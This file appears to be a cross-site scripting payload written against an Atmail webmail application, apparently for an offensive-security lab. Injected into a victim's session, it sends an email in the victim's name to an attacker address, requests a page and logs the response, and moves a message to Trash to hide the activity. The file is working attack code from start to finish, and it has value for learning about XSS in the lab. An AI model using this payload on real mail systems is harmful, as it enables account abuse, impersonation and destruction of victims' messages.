var email = "attacker@offsec.local"; 
var subject = "hacked!";
var message = "This is a test email!";

function send_email()
{
	var uri ="/index.php/mail/composemessage/send/tabId/viewmessageTab1"; 
	var query_string = "?emailTo=" + email + "&emailSubject=" + subject + "&emailBodyHtml= + message";

	xhr = new XMLHttpRequest(); 
	xhr.open("GET", uri + query_string, true); 
	xhr.send(null);
} 
send_email();


function read_body(xhr) { 
	var data;
	if (!xhr.responseType || xhr.responseType === "text") {
		data = xhr.responseText;
	} else if (xhr.responseType === "document") {
		data = xhr.responseXML;
	} else if (xhr.responseType === "json") {
		data = xhr.responseJSON;
	} else {
		data = xhr.response;
	}
   	return data;
}
var xhr = new XMLHttpRequest(); 
xhr.onreadystatechange = function() {

	if (xhr.readyState == XMLHttpRequest.DONE) {
		console.log(read_body(xhr)); 
	}
}
xhr.open('GET', 'http://atmail', true);
xhr.send(null);


function wipe_email()
{	
	var uri = "/index.php/mail/mail/movetofolder/fromFolder/INBOX/toFolder/INBOX.Trash";

	xhr = new XMLHttpRequest();
	xhr.open("POST", uri, true);
	xhr.send('mailId%5B%5D=35B39');

}
wipe_email();

